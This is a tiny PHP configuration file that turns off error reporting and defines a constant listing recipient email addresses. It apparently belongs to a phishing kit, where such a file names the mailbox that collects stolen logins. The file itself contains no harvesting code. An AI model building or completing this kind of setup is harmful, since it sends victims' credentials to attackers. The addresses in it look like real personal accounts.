<?php
error_reporting(0);
$ur_email   = "goldbello123@gmail.com
, emersongold@yandex.com, goldbello123@gmail.com
";
define("EMAIL", "$ur_email");
?>